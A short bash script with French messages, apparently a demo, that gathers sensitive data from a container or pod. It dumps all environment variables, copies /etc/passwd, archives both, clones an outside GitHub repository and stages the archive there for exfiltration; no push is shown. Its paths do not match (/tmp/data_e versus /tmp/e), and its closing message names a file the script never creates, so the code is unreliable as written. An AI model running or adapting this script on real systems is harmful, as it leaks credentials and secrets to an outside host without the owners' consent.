#!/bin/bash

set -e

echo "Date et heure : $(date)"

echo "Adresse IP du pod (via hostname) :"
hostname -i

echo "Liste des fichiers /tmp :"
ls -l /tmp

echo "Variables d'environnement :"
printenv

# Installe git
apt-get update && apt-get install -y git

echo "Collecte des données sensibles..."

mkdir -p /tmp/data_e
cp /etc/passwd /tmp/e/users.txt
printenv > /tmp/e/env_vars.txt


echo "Création de l'archive..."
tar czf /tmp/data_e.tar.gz -C /tmp/e .


# Clone le repo 
git clone https://github.com/Fekr09a/ai-demo.git
cd ai-demo
git config user.email "Paris@PlatformCon.com"
cp /tmp/data_e.tar.gz .
ls
git add data_e.tar.gz

echo "Les données ont été collectées et archivées dans /tmp/data_exfiltrated.tar.gz"
echo "Script terminé."
